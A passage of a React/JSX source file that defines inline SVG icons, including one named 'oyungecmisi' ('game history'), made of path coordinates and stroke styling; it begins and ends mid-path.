22.5549C18.6721 22.5667 18.6655 22.5828 18.6655 22.5995Z"
    stroke="#2A421C"
    strokeWidth="0.525"
    strokeMiterlimit={10}
  />
  <path
    d="M25.9 24.6995C25.8337 24.6999 25.7679 24.6872 25.7066 24.662C25.6452 24.6369 25.5895 24.5998 25.5426 24.5529C25.4957 24.506 25.4586 24.4502 25.4334 24.3889C25.4083 24.3275 25.3955 24.2618 25.396 24.1955V22.5995C25.396 22.4658 25.4491 22.3376 25.5436 22.2431C25.6381 22.1486 25.7663 22.0955 25.9 22.0955H27.496C27.6297 22.0955 27.7579 22.1486 27.8524 22.2431C27.9469 22.3376 28 22.4658 28 22.5995V24.1955C28.0005 24.2618 27.9878 24.3275 27.9626 24.3889C27.9374 24.4502 27.9003 24.506 27.8534 24.5529C27.8065 24.5998 27.7508 24.6369 27.6894 24.662C27.6281 24.6872 27.5623 24.6999 27.496 24.6995H25.9ZM25.837 22.5995V24.1955C25.837 24.2125 25.8435 24.2289 25.8552 24.2413C25.867 24.2537 25.883 24.2611 25.9 24.262H27.496C27.5134 24.2611 27.5298 24.2538 27.5421 24.2415C27.5544 24.2292 27.5617 24.2128 27.5625 24.1955V22.5995C27.5616 22.5824 27.5542 22.5664 27.5418 22.5547C27.5295 22.543 27.5131 22.5364 27.496 22.5365H25.9C25.8839 22.5374 25.8688 22.5444 25.8577 22.5561C25.8466 22.5678 25.8405 22.5833 25.8405 22.5995H25.837Z"
    stroke="#2A421C"
    strokeWidth="0.525"
    strokeMiterlimit={10}
  />
  <path
    d="M22.316 24.6995C22.1823 24.6995 22.0541 24.6464 21.9596 24.5518C21.8651 24.4573 21.812 24.3291 21.812 24.1955V22.5995C21.8129 22.4661 21.8663 22.3384 21.9606 22.2441C22.055 22.1498 22.1826 22.0964 22.316 22.0955H23.912C24.0457 22.0955 24.1739 22.1486 24.2684 22.2431C24.3629 22.3376 24.416 22.4658 24.416 22.5995V24.1955C24.4165 24.2618 24.4038 24.3275 24.3786 24.3889C24.3534 24.4502 24.3163 24.506 24.2694 24.5529C24.2225 24.5998 24.1668 24.6369 24.1054 24.662C24.0441 24.6872 23.9783 24.6999 23.912 24.6995H22.316ZM22.253 22.5995V24.1955C22.253 24.2125 22.2595 24.2289 22.2712 24.2413C22.283 24.2537 22.299 24.2611 22.316 24.262H23.912C23.9294 24.2611 23.9458 24.2538 23.9581 24.2415C23.9704 24.2292 23.9777 24.2128 23.9785 24.1955V22.5995C23.9776 22.5824 23.9702 22.5664 23.9578 22.5547C23.9455 22.543 23.9291 22.5364 23.912 22.5365H22.316C22.2993 22.5365 22.2833 22.5431 22.2715 22.5549C22.2596 22.5667 22.253 22.5827 22.253 22.5995Z"
    stroke="#2A421C"
    strokeWidth="0.525"
    strokeMiterlimit={10}
  />
  <path
    d="M18.7285 28.1505C18.5957 28.1496 18.4686 28.0967 18.3743 28.0031C18.2801 27.9095 18.2263 27.7828 18.2245 27.65V26.0505C18.2245 25.9845 18.2375 25.9191 18.2629 25.8582C18.2883 25.7972 18.3255 25.7419 18.3723 25.6953C18.4192 25.6488 18.4748 25.612 18.5359 25.5871C18.597 25.5621 18.6625 25.5495 18.7285 25.55H20.3245C20.3908 25.5495 20.4566 25.5623 20.5179 25.5874C20.5793 25.6126 20.635 25.6497 20.6819 25.6966C20.7288 25.7435 20.7659 25.7992 20.7911 25.8606C20.8162 25.9219 20.829 25.9877 20.8285 26.054V27.65C20.8276 27.7834 20.7742 27.911 20.6799 28.0054C20.5855 28.0997 20.4579 28.1531 20.3245 28.154L18.7285 28.1505ZM18.6655 26.0505V27.65C18.6655 27.6583 18.6671 27.6665 18.6703 27.6741C18.6734 27.6818 18.6781 27.6887 18.6839 27.6945C18.6898 27.7004 18.6967 27.705 18.7044 27.7082C18.712 27.7114 18.7202 27.713 18.7285 27.713H20.3245C20.3415 27.713 20.3579 27.7065 20.3703 27.6948C20.3827 27.6831 20.3901 27.667 20.391 27.65V26.0505C20.3901 26.0331 20.3829 26.0167 20.3706 26.0044C20.3583 25.9921 20.3419 25.9848 20.3245 25.984H18.7285C18.7115 25.9849 18.6954 25.9923 18.6837 26.0047C18.672 26.017 18.6655 26.0335 18.6655 26.0505Z"
    stroke="#2A421C"
    strokeWidth="0.525"
    strokeMiterlimit={10}
  />
  <path
    d="M22.316 28.1505C22.1832 28.1496 22.0561 28.0967 21.9619 28.0031C21.8676 27.9095 21.8138 27.7828 21.812 27.65V26.0505C21.812 25.9845 21.8251 25.9191 21.8504 25.8582C21.8758 25.7972 21.913 25.7419 21.9598 25.6953C22.0067 25.6488 22.0623 25.612 22.1234 25.5871C22.1845 25.5621 22.25 25.5495 22.316 25.55H23.912C23.9783 25.5495 24.0441 25.5623 24.1054 25.5874C24.1668 25.6126 24.2225 25.6497 24.2694 25.6966C24.3163 25.7435 24.3534 25.7992 24.3786 25.8606C24.4038 25.9219 24.4165 25.9877 24.416 26.054V27.65C24.4151 27.7834 24.3617 27.911 24.2674 28.0054C24.1731 28.0997 24.0454 28.1531 23.912 28.154L22.316 28.1505ZM22.253 26.0505V27.65C22.253 27.6583 22.2546 27.6665 22.2578 27.6741C22.261 27.6818 22.2656 27.6887 22.2715 27.6945C22.2773 27.7004 22.2843 27.705 22.2919 27.7082C22.2995 27.7114 22.3077 27.713 22.316 27.713H23.912C23.9288 27.7122 23.9448 27.7055 23.957 27.6939C23.9692 27.6823 23.9768 27.6667 23.9785 27.65V26.0505C23.9777 26.0331 23.9704 26.0167 23.9581 26.0044C23.9458 25.9921 23.9294 25.9848 23.912 25.984H22.316C22.299 25.9849 22.283 25.9923 22.2712 26.0047C22.2595 26.017 22.253 26.0335 22.253 26.0505Z"
    stroke="#2A421C"
    strokeWidth="0.525"
    strokeMiterlimit={10}
  />
  <path
    d="M15.141 24.6995C15.0073 24.6995 14.8791 24.6464 14.7846 24.5519C14.6901 24.4573 14.637 24.3291 14.637 24.1955V22.5995C14.637 22.4658 14.6901 22.3376 14.7846 22.2431C14.8791 22.1486 15.0073 22.0955 15.141 22.0955H16.737C16.8033 22.095 16.8691 22.1077 16.9304 22.1329C16.9918 22.1581 17.0475 22.1952 17.0944 22.2421C17.1413 22.2889 17.1784 22.3447 17.2036 22.406C17.2287 22.4674 17.2415 22.5332 17.241 22.5995V24.1955C17.2415 24.2618 17.2287 24.3275 17.2036 24.3889C17.1784 24.4503 17.1413 24.506 17.0944 24.5529C17.0475 24.5998 16.9918 24.6369 16.9304 24.6621C16.8691 24.6872 16.8033 24.6999 16.737 24.6995H15.141ZM15.078 22.5995V24.1955C15.0788 24.2123 15.0855 24.2282 15.0971 24.2405C15.1087 24.2527 15.1243 24.2603 15.141 24.262H16.737C16.7544 24.2611 16.7708 24.2538 16.7831 24.2416C16.7954 24.2293 16.8026 24.2128 16.8035 24.1955V22.5995C16.8026 22.5824 16.7952 22.5664 16.7828 22.5547C16.7704 22.543 16.754 22.5364 16.737 22.5365H15.141C15.1246 22.5373 15.109 22.5442 15.0974 22.5559C15.0857 22.5675 15.0788 22.583 15.078 22.5995Z"
    stroke="#2A421C"
    strokeWidth="0.525"
    strokeMiterlimit={10}
  />
  <path
    d="M15.141 28.1505C15.0082 28.1496 14.8811 28.0967 14.7868 28.0031C14.6926 27.9095 14.6388 27.7828 14.637 27.65V26.0505C14.6388 25.9177 14.6926 25.791 14.7868 25.6974C14.8811 25.6038 15.0082 25.5509 15.141 25.55H16.737C16.8033 25.5495 16.8691 25.5623 16.9304 25.5874C16.9918 25.6126 17.0475 25.6497 17.0944 25.6966C17.1413 25.7435 17.1784 25.7992 17.2036 25.8606C17.2287 25.9219 17.2415 25.9877 17.241 26.054V27.65C17.2401 27.7834 17.1867 27.911 17.0924 28.0054C16.998 28.0997 16.8704 28.1531 16.737 28.154L15.141 28.1505ZM15.078 26.0505V27.65C15.0788 27.6664 15.0857 27.682 15.0974 27.6936C15.109 27.7052 15.1246 27.7122 15.141 27.713H16.737C16.7534 27.7122 16.769 27.7052 16.7806 27.6936C16.7922 27.682 16.7991 27.6664 16.8 27.65V26.0505C16.7991 26.0331 16.7919 26.0167 16.7796 26.0044C16.7673 25.9921 16.7509 25.9848 16.7335 25.984H15.141C15.124 25.9849 15.1079 25.9923 15.0962 26.0047C15.0845 26.017 15.078 26.0335 15.078 26.0505Z"
    stroke="#2A421C"
    strokeWidth="0.525"
    strokeMiterlimit={10}
  />
  <path
    d="M17.6645 13.125C17.606 13.125 17.5499 13.1017 17.5086 13.0604C17.4672 13.019 17.444 12.9629 17.444 12.9045C17.444 12.846 17.4672 12.7899 17.5086 12.7485C17.5499 12.7072 17.606 12.684 17.6645 12.684H24.976C25.005 12.684 25.0336 12.6897 25.0604 12.7007C25.0871 12.7118 25.1114 12.7281 25.1319 12.7485C25.1524 12.769 25.1686 12.7933 25.1797 12.8201C25.1908 12.8468 25.1965 12.8755 25.1965 12.9045C25.1965 12.9334 25.1908 12.9621 25.1797 12.9888C25.1686 13.0156 25.1524 13.0399 25.1319 13.0604C25.1114 13.0809 25.0871 13.0971 25.0604 13.1082C25.0336 13.1193 25.005 13.125 24.976 13.125H17.6645Z"
    stroke="#2A421C"
    strokeWidth="0.525"
    strokeMiterlimit={10}
  />
  <path
    d="M15.0955 13.125H15.7115C15.77 13.125 15.8261 13.1017 15.8674 13.0604C15.9088 13.019 15.932 12.9629 15.932 12.9045C15.932 12.846 15.9088 12.7899 15.8674 12.7485C15.8261 12.7072 15.77 12.684 15.7115 12.684H15.0955V13.125Z"
    stroke="#2A421C"
    strokeWidth="0.525"
    strokeMiterlimit={10}
  />
  <path
    d="M29.4 12.684H26.95C26.8915 12.684 26.8354 12.7072 26.7941 12.7485C26.7527 12.7899 26.7295 12.846 26.7295 12.9045C26.7295 12.9629 26.7527 13.019 26.7941 13.0604C26.8354 13.1017 26.8915 13.125 26.95 13.125H29.4C29.4724 13.125 29.5418 13.1537 29.593 13.2049C29.6442 13.2561 29.673 13.3256 29.673 13.398V16.45H12.9815V15.449H12.5405V16.66C12.5425 16.7123 12.5636 16.7622 12.6 16.8C12.6406 16.8415 12.6959 16.8654 12.754 16.8665H29.8795C29.9387 16.866 29.9954 16.8421 30.037 16.8C30.0736 16.762 30.0959 16.7125 30.1 16.66V13.398C30.1019 13.3049 30.0851 13.2123 30.0508 13.1258C30.0164 13.0392 29.9652 12.9604 29.9 12.8939C29.8348 12.8274 29.757 12.7746 29.6711 12.7386C29.5853 12.7025 29.4931 12.6839 29.4 12.684Z"
    stroke="#2A421C"
    strokeWidth="0.525"
    strokeMiterlimit={10}
  />
</svg>
  )

  const oyungecmisi = (
    <svg
  width={35}
  height={35}
  viewBox="0 0 35 35"
  fill="none"
  xmlns="http://www.w3.org/2000/svg"
  className="w-[35px] h-[35px] relative"
  preserveAspectRatio="none"
>
  <path d="M35 0H0V35H35V0Z" fill="white" />
  <path
    d="M13.4295 30.45V30.0125H29.5295C29.6022 30.0116 29.6717 29.9821 29.7228 29.9303C29.7739 29.8785 29.8025 29.8087 29.8025 29.736V16.8315H13.153V29.75C13.1539 29.8231 13.1834 29.8929 13.235 29.9445C13.2867 29.9962 13.3565 30.0256 13.4295 30.0265V30.45ZM13.4295 30.45C13.2439 30.45 13.0658 30.3763 12.9345 30.245C12.8033 30.1137 12.7295 29.9357 12.7295 29.75V16.6145C12.729 16.5854 12.7344 16.5565 12.7453 16.5296C12.7563 16.5026 12.7725 16.4781 12.7931 16.4575C12.8136 16.437 12.8381 16.4207 12.8651 16.4098C12.892 16.3989 12.9209 16.3935 12.95 16.394H30.03C30.0873 16.3955 30.1421 16.4179 30.184 16.457C30.2261 16.4987 30.25 16.5553 30.2505 16.6145V29.75C30.2505 29.9357 30.1768 30.1137 30.0455 30.245C29.9142 30.3763 29.7362 30.45 29.5505 30.45H13.4295Z"
    stroke="#2A421C"
    strokeWidth="1.05"
    strokeMiterlimit={10}
    strokeLinecap="round"
    strokeLinejoin="round"
  />
  <path
    fillRule="evenodd"
    clipRule="evenodd"
    d="M24.913 13.839V11.9C24.8948 11.7324 24.9122 11.5629 24.9639 11.4024C25.0155 11.242 25.1004 11.0942 25.213 10.9688C25.3256 10.8433 25.4634 10.743 25.6173 10.6743C25.7713 10.6056 25.9379 10.5701 26.1065 10.5701C26.2751 10.5701 26.4418 10.6056 26.5957 10.6743C26.7497 10.743 26.8874 10.8433 27 10.9688C27.1126 11.0942 27.1975 11.242 27.2492 11.4024C27.3009 11.5629 27.3182 11.7324 27.3 11.9V13.8495C27.3156 14.0159 27.2963 14.1837 27.2434 14.3422C27.1904 14.5007 27.1049 14.6464 26.9924 14.7699C26.8799 14.8935 26.7428 14.9922 26.59 15.0597C26.4371 15.1273 26.2719 15.1622 26.1048 15.1622C25.9377 15.1622 25.7724 15.1273 25.6195 15.0597C25.4667 14.9922 25.3296 14.8935 25.2171 14.7699C25.1046 14.6464 25.0191 14.5007 24.9662 14.3422C24.9132 14.1837 24.8939 14.0159 24.9095 13.8495L24.913 13.839ZM25.354 11.9V13.8495C25.3374 13.9582 25.3445 14.0692 25.3748 14.1749C25.405 14.2806 25.4578 14.3785 25.5294 14.4619C25.6011 14.5453 25.6899 14.6122 25.7898 14.6581C25.8897 14.704 25.9983 14.7277 26.1083 14.7277C26.2182 14.7277 26.3268 14.704 26.4268 14.6581C26.5267 14.6122 26.6155 14.5453 26.6871 14.4619C26.7587 14.3785 26.8115 14.2806 26.8418 14.1749C26.872 14.0692 26.8791 13.9582 26.8625 13.8495V11.9C26.8791 11.7913 26.872 11.6804 26.8418 11.5747C26.8115 11.469 26.7587 11.3711 26.6871 11.2877C26.6155 11.2043 26.5267 11.1373 26.4268 11.0914C26.3268 11.0456 26.2182 11.0218 26.1083 11.0218C25.9983 11.0218 25.8897 11.0456 25.7898 11.0914C25.6899 11.1373 25.6011 11.2043 25.5294 11.2877C25.4578 11.3711 25.405 11.469 25.3748 11.5747C25.3445 11.6804 25.3374 11.7913 25.354 11.9Z"
    stroke="#2A421C"
    strokeWidth="1.05"
    strokeMiterlimit={10}
    strokeLinecap="round"
    strokeLinejoin="round"
  />
  <path
    fillRule="evenodd"
    clipRule="evenodd"
    d="M15.6625 13.839V11.9C15.6499 11.7356 15.6714 11.5703 15.7257 11.4146C15.78 11.2589 15.8658 11.1161 15.9779 10.9951C16.0899 10.8741 16.2258 10.7776 16.3769 10.7116C16.528 10.6456 16.6911 10.6115 16.856 10.6115C17.0209 10.6115 17.184 10.6456 17.3352 10.7116C17.4863 10.7776 17.6221 10.8741 17.7342 10.9951C17.8462 11.1161 17.9321 11.2589 17.9864 11.4146C18.0406 11.5703 18.0621 11.7356 18.0495 11.9V13.8495C18.0621 14.0139 18.0406 14.1791 17.9864 14.3349C17.9321 14.4906 17.8462 14.6334 17.7342 14.7544C17.6221 14.8754 17.4863 14.9719 17.3352 15.0379C17.184 15.1039 17.0209 15.138 16.856 15.138C16.6911 15.138 16.528 15.1039 16.3769 15.0379C16.2258 14.9719 16.0899 14.8754 15.9779 14.7544C15.8658 14.6334 15.78 14.4906 15.7257 14.3349C15.6714 14.1791 15.6499 14.0139 15.6625 13.8495V13.839ZM16.1 13.839C16.0853 13.9469 16.0939 14.0567 16.1251 14.161C16.1564 14.2654 16.2096 14.3618 16.2812 14.4438C16.3528 14.5259 16.4412 14.5917 16.5403 14.6367C16.6395 14.6818 16.7471 14.7051 16.856 14.7051C16.9649 14.7051 17.0726 14.6818 17.1717 14.6367C17.2709 14.5917 17.3592 14.5259 17.4309 14.4438C17.5025 14.3618 17.5557 14.2654 17.5869 14.161C17.6182 14.0567 17.6267 13.9469 17.612 13.839V11.9C17.6267 11.7921 17.6182 11.6823 17.5869 11.5779C17.5557 11.4736 17.5025 11.3772 17.4309 11.2951C17.3592 11.2131 17.2709 11.1473 17.1717 11.1022C17.0726 11.0572 16.9649 11.0339 16.856 11.0339C16.7471 11.0339 16.6395 11.0572 16.5403 11.1022C16.4412 11.1473 16.3528 11.2131 16.2812 11.2951C16.2096 11.3772 16.1564 11.4736 16.1251 11.5779C16.0939 11.6823 16.0853 11.7921 16.1 11.9V13.839Z"
    stroke="#2A421C"
    strokeWidth="1.05"
    strokeMiterlimit={10}
    strokeLinecap="round"
    strokeLinejoin="round"
  />
  <path
    fillRule="evenodd"
    clipRule="evenodd"
    d="M18.9 21.1995C18.7669 21.1977 18.6398 21.144 18.5456 21.0499C18.4515 20.9558 18.3978 20.8286 18.396 20.6955V19.0995C18.397 18.9664 18.4505 18.8392 18.5449 18.7454C18.6393 18.6516 18.767 18.599 18.9 18.599H20.496C20.562 18.5985 20.6275 18.6112 20.6886 18.6361C20.7498 18.661 20.8054 18.6978 20.8522 18.7444C20.899 18.7909 20.9362 18.8462 20.9616 18.9072C20.987 18.9681 21 19.0335 21 19.0995V20.6955C21 20.8286 20.9474 20.9562 20.8536 21.0507C20.7599 21.1451 20.6326 21.1986 20.4995 21.1995H18.9ZM18.837 19.0995V20.6955C18.8379 20.7119 18.8448 20.7275 18.8564 20.7391C18.8681 20.7508 18.8836 20.7577 18.9 20.7585H20.496C20.5125 20.7577 20.528 20.7508 20.5396 20.7391C20.5513 20.7275 20.5582 20.7119 20.559 20.6955V19.0995C20.5582 19.0831 20.5513 19.0675 20.5396 19.0559C20.528 19.0443 20.5125 19.0374 20.496 19.0365H18.9C18.8913 19.036 18.8825 19.0373 18.8743 19.0402C18.866 19.0431 18.8585 19.0476 18.852 19.0535C18.8455 19.0593 18.8402 19.0664 18.8364 19.0743C18.8326 19.0822 18.8305 19.0908 18.83 19.0995H18.837Z"
    stroke="#2A421C"
    strokeWidth="1.05"
    strokeMiterlimit={10}
    strokeLinecap="round"
    strokeLinejoin="round"
  />
  <path
    fillRule="evenodd"
    clipRule="evenodd"
    d="M22.477 21.1995C22.3436 21.1986 22.216 21.1452 22.1217 21.0509C22.0273 20.9566 21.9739 20.8289 21.973 20.6955V19.0995C21.973 19.0335 21.9861 18.9681 22.0115 18.9072C22.0368 18.8462 22.074 18.7909 22.1209 18.7444C22.1677 18.6978 22.2233 18.661 22.2844 18.6361C22.3455 18.6112 22.411 18.5985 22.477 18.599H24.0695C24.1355 18.5985 24.201 18.6112 24.2621 18.6361C24.3233 18.661 24.3788 18.6978 24.4257 18.7444C24.4725 18.7909 24.5097 18.8462 24.5351 18.9072C24.5605 18.9681 24.5735 19.0335 24.5735 19.0995V20.6955C24.5726 20.8289 24.5192 20.9566 24.4249 21.0509C24.3306 21.1452 24.2029 21.1986 24.0695 21.1995H22.477ZM22.414 19.0995V20.6955C22.414 20.7038 22.4157 20.712 22.4188 20.7196C22.422 20.7273 22.4266 20.7342 22.4325 20.7401C22.4383 20.7459 22.4453 20.7505 22.4529 20.7537C22.4606 20.7569 22.4688 20.7585 22.477 20.7585H24.0695C24.0866 20.7585 24.103 20.752 24.1153 20.7403C24.1277 20.7286 24.1351 20.7125 24.136 20.6955V19.0995C24.1344 19.0828 24.1267 19.0672 24.1145 19.0556C24.1023 19.0441 24.0863 19.0373 24.0695 19.0365H22.477C22.4677 19.035 22.4582 19.0355 22.4492 19.038C22.4401 19.0404 22.4316 19.0447 22.4244 19.0507C22.4171 19.0567 22.4112 19.0641 22.407 19.0725C22.4028 19.0809 22.4004 19.0901 22.4 19.0995H22.414Z"
    stroke="#2A421C"
    strokeWidth="1.05"
    strokeMiterlimit={10}
    strokeLinecap="round"
    strokeLinejoin="round"
  />
  <path
    fillRule="evenodd"
    clipRule="evenodd"
    d="M26.0575 21.1995C25.9238 21.1986 25.7958 21.1453 25.7009 21.0511C25.606 20.9569 25.5518 20.8292 25.55 20.6955V19.0995C25.5509 18.9664 25.6044 18.8391 25.6989 18.7454C25.7933 18.6516 25.921 18.599 26.054 18.599H27.65C27.7831 18.599 27.9108 18.6516 28.0052 18.7454C28.0996 18.8391 28.1531 18.9664 28.154 19.0995V20.6955C28.1522 20.8286 28.0985 20.9557 28.0044 21.0499C27.9103 21.144 27.7831 21.1977 27.65 21.1995H26.0575ZM25.9945 19.0995V20.6955C25.9945 20.7122 26.0012 20.7282 26.013 20.74C26.0248 20.7519 26.0408 20.7585 26.0575 20.7585H27.65C27.6583 20.7585 27.6665 20.7569 27.6741 20.7537C27.6818 20.7505 27.6887 20.7459 27.6946 20.74C27.7004 20.7342 27.7051 20.7273 27.7082 20.7196C27.7114 20.712 27.713 20.7038 27.713 20.6955V19.0995C27.7122 19.0831 27.7053 19.0675 27.6936 19.0559C27.682 19.0443 27.6665 19.0373 27.65 19.0365H26.0575C26.0411 19.0373 26.0255 19.0443 26.0139 19.0559C26.0023 19.0675 25.9954 19.0831 25.9945 19.0995Z"
    stroke="#2A421C"
    strokeWidth="1.05"
    strokeMiterlimit={10}
    strokeLinecap="round"
    strokeLinejoin="round"
  />
  <path
    fillRule="evenodd"
    clipRule="evenodd"
    d="M18.9 24.6435C18.7672 24.6444 18.6393 24.5933 18.5438 24.501C18.4482 24.4088 18.3927 24.2827 18.389 24.15V22.5435C18.3918 22.4104 18.447 22.2838 18.5428 22.1914C18.6385 22.0989 18.7669 22.0481 18.9 22.05H20.496C20.6279 22.0499 20.7545 22.1016 20.8487 22.1939C20.9429 22.2861 20.9973 22.4116 21 22.5435V24.15C20.9991 24.2834 20.9457 24.411 20.8514 24.5053C20.7571 24.5997 20.6294 24.6531 20.496 24.654L18.9 24.6435ZM18.837 22.5435V24.15C18.837 24.1583 18.8386 24.1664 18.8418 24.1741C18.845 24.1817 18.8496 24.1887 18.8555 24.1945C18.8613 24.2004 18.8683 24.205 18.8759 24.2082C18.8835 24.2113 18.8917 24.213 18.9 24.213H20.496C20.5124 24.2121 20.528 24.2052 20.5396 24.1936C20.5513 24.182 20.5582 24.1664 20.559 24.15V22.5435C20.5582 22.527 20.5513 22.5115 20.5396 22.4999C20.528 22.4882 20.5124 22.4813 20.496 22.4805H18.9C18.8913 22.48 18.8825 22.4813 18.8743 22.4842C18.866 22.4871 18.8584 22.4916 18.8519 22.4975C18.8454 22.5033 18.8401 22.5104 18.8364 22.5183C18.8326 22.5262 18.8305 22.5347 18.83 22.5435H18.837Z"
    stroke="#2A421C"
    strokeWidth="1.05"
    strokeMiterlimit={10}
    strokeLinecap="round"
    strokeLinejoin="round"
  />
  <path
    fillRule="evenodd"
    clipRule="evenodd"
    d="M26.0575 24.6435C25.9253 24.6435 25.7983 24.592 25.7035 24.4998C25.6087 24.4077 25.5537 24.2821 25.55 24.15V22.547C25.5528 22.4142 25.6074 22.2878 25.7023 22.1949C25.7972 22.102 25.9247 22.05 26.0575 22.05H27.65C27.7834 22.0509 27.9111 22.1043 28.0054 22.1986C28.0997 22.2929 28.1531 22.4206 28.154 22.554V24.15C28.1504 24.2815 28.0958 24.4065 28.0018 24.4986C27.9077 24.5907 27.7816 24.6426 27.65 24.6435H26.0575ZM25.9945 22.5435V24.15C25.9945 24.1583 25.9961 24.1665 25.9993 24.1741C26.0025 24.1817 26.0071 24.1887 26.013 24.1945C26.0188 24.2004 26.0258 24.205 26.0334 24.2082C26.0411 24.2114 26.0492 24.213 26.0575 24.213H27.65C27.6583 24.213 27.6665 24.2114 27.6741 24.2082C27.6818 24.205 27.6887 24.2004 27.6946 24.1945C27.7004 24.1887 27.7051 24.1817 27.7082 24.1741C27.7114 24.1665 27.713 24.1583 27.713 24.15V22.547C27.713 22.5299 27.7065 22.5135 27.6948 22.5012C27.6831 22.4888 27.667 22.4814 27.65 22.4805H26.0575C26.0405 22.4814 26.0245 22.4888 26.0127 22.5012C26.001 22.5135 25.9945 22.5299 25.9945 22.547V22.5435Z"
    stroke="#2A421C"
    strokeWidth="1.05"
    strokeMiterlimit={10}
    strokeLinecap="round"
    strokeLinejoin="round"
  />
  <path
    fillRule="evenodd"
    clipRule="evenodd"
    d="M22.477 24.6435C22.3452 24.6435 22.2185 24.5919 22.1243 24.4996C22.0301 24.4074 21.9758 24.2818 21.973 24.15V22.5435C21.9749 22.4114 22.0289 22.2853 22.1233 22.1929C22.2177 22.1004 22.3449 22.0491 22.477 22.05H24.0695C24.1355 22.0495 24.201 22.0621 24.2621 22.0871C24.3233 22.112 24.3788 22.1488 24.4257 22.1954C24.4725 22.2419 24.5097 22.2972 24.5351 22.3582C24.5605 22.4191 24.5735 22.4845 24.5735 22.5505V24.15C24.5735 24.2837 24.5204 24.4119 24.4259 24.5064C24.3314 24.6009 24.2032 24.654 24.0695 24.654L22.477 24.6435ZM22.414 22.5435V24.15C22.414 24.1583 22.4157 24.1665 22.4188 24.1741C22.422 24.1818 22.4266 24.1887 22.4325 24.1945C22.4383 24.2004 22.4453 24.205 22.4529 24.2082C22.4606 24.2114 22.4688 24.213 22.477 24.213H24.0695C24.0791 24.2151 24.0889 24.215 24.0984 24.2128C24.1079 24.2106 24.1169 24.2064 24.1245 24.2004C24.1322 24.1944 24.1385 24.1867 24.1429 24.178C24.1473 24.1693 24.1497 24.1598 24.15 24.15V22.5435C24.1484 22.5268 24.1407 22.5112 24.1285 22.4996C24.1163 22.488 24.1003 22.4813 24.0835 22.4805H22.477C22.4677 22.479 22.4582 22.4795 22.4492 22.4819C22.4401 22.4844 22.4316 22.4887 22.4244 22.4947C22.4171 22.5006 22.4112 22.5081 22.407 22.5165C22.4028 22.5249 22.4004 22.5341 22.4 22.5435H22.414Z"
    stroke="#2A421C"
    strokeWidth="1.05"
    strokeMiterlimit={10}
    strokeLinecap="round"
    strokeLinejoin="round"
  />
  <path
    fillRule="evenodd"
    clipRule="evenodd"
    d="M18.9 28.0875C18.7666 28.0866 18.639 28.0332 18.5447 27.9389C18.4503 27.8445 18.3969 27.7169 18.396 27.5835V25.991C18.3969 25.8576 18.4503 25.73 18.5447 25.6356C18.639 25.5413 18.7666 25.4879 18.9 25.487H20.496C20.6294 25.4879 20.7571 25.5413 20.8514 25.6356C20.9457 25.73 20.9991 25.8576 21 25.991V27.5835C20.9991 27.7169 20.9457 27.8445 20.8514 27.9389C20.7571 28.0332 20.6294 28.0866 20.496 28.0875H18.9ZM18.837 25.9875V27.58C18.8366 27.5887 18.8378 27.5975 18.8407 27.6057C18.8436 27.614 18.8481 27.6216 18.854 27.6281C18.8599 27.6346 18.8669 27.6399 18.8748 27.6436C18.8827 27.6474 18.8913 27.6496 18.9 27.65H20.496C20.5128 27.6483 20.5283 27.6407 20.5399 27.6285C20.5515 27.6163 20.5583 27.6003 20.559 27.5835V25.991C20.5583 25.9742 20.5515 25.9582 20.5399 25.946C20.5283 25.9338 20.5128 25.9262 20.496 25.9245H18.9C18.891 25.924 18.882 25.9254 18.8735 25.9285C18.865 25.9316 18.8573 25.9365 18.8507 25.9427C18.8442 25.9489 18.839 25.9564 18.8354 25.9647C18.8318 25.973 18.83 25.982 18.83 25.991L18.837 25.9875Z"
    stroke="#2A421C"
    strokeWidth="1.05"
    strokeMiterlimit={10}
    strokeLinecap="round"
    strokeLinejoin="round"
  />
  <path
    fillRule="evenodd"
    clipRule="evenodd"
    d="M22.477 28.0875C22.4107 28.088 22.3449 28.0753 22.2836 28.0501C22.2222 28.0249 22.1665 27.9878 22.1196 27.9409C22.0727 27.894 22.0356 27.8383 22.0104 27.7769C21.9853 27.7156 21.9725 27.6498 21.973 27.5835V25.991C21.9725 25.9247 21.9853 25.8589 22.0104 25.7976C22.0356 25.7362 22.0727 25.6805 22.1196 25.6336C22.1665 25.5867 22.2222 25.5496 22.2836 25.5244C22.3449 25.4993 22.4107 25.4865 22.477 25.487H24.0695C24.1358 25.4865 24.2016 25.4993 24.2629 25.5244C24.3243 25.5496 24.38 25.5867 24.4269 25.6336C24.4738 25.6805 24.5109 25.7362 24.5361 25.7976C24.5613 25.8589 24.574 25.9247 24.5735 25.991V27.5835C24.574 27.6498 24.5613 27.7156 24.5361 27.7769C24.5109 27.8383 24.4738 27.894 24.4269 27.9409C24.38 27.9878 24.3243 28.0249 24.2629 28.0501C24.2016 28.0753 24.1358 28.088 24.0695 28.0875H22.477ZM22.414 25.9875V27.58C22.4149 27.5974 22.4221 27.6138 22.4344 27.6261C22.4467 27.6384 22.4631 27.6457 22.4805 27.6465H24.073C24.0904 27.6457 24.1068 27.6384 24.1191 27.6261C24.1314 27.6138 24.1387 27.5974 24.1395 27.58V25.991C24.1387 25.9736 24.1314 25.9572 24.1191 25.9449C24.1068 25.9326 24.0904 25.9254 24.073 25.9245H22.477C22.4674 25.923 22.4576 25.9236 22.4483 25.9262C22.439 25.9289 22.4304 25.9335 22.423 25.9398C22.4157 25.9462 22.4098 25.954 22.4059 25.9629C22.4019 25.9717 22.3999 25.9813 22.4 25.991L22.414 25.9875Z"
    stroke="#2A421C"
    strokeWidth="1.05"
    strokeMiterlimit={10}
    strokeLinecap="round"
    strokeLinejoin="round"
  />
  <path
    fillRule="evenodd"
    clipRule="evenodd"
    d="M15.3125 24.6435C15.1804 24.6444 15.0532 24.5931 14.9588 24.5006C14.8644 24.4082 14.8103 24.2821 14.8085 24.15V22.5435C14.8103 22.4114 14.8644 22.2853 14.9588 22.1929C15.0532 22.1004 15.1804 22.0491 15.3125 22.05H16.905C16.971 22.0495 17.0365 22.0621 17.0976 22.0871C17.1587 22.112 17.2143 22.1488 17.2612 22.1954C17.308 22.2419 17.3452 22.2972 17.3706 22.3582C17.3959 22.4191 17.409 22.4845 17.409 22.5505V24.15C17.4095 24.2163 17.3967 24.2821 17.3716 24.3434C17.3464 24.4048 17.3093 24.4605 17.2624 24.5074C17.2155 24.5543 17.1598 24.5914 17.0984 24.6166C17.0371 24.6417 16.9713 24.6545 16.905 24.654L15.3125 24.6435ZM15.246 22.5435V24.15C15.2469 24.167 15.2543 24.1831 15.2667 24.1948C15.279 24.2065 15.2955 24.213 15.3125 24.213H16.905C16.922 24.213 16.9385 24.2065 16.9508 24.1948C16.9632 24.1831 16.9706 24.167 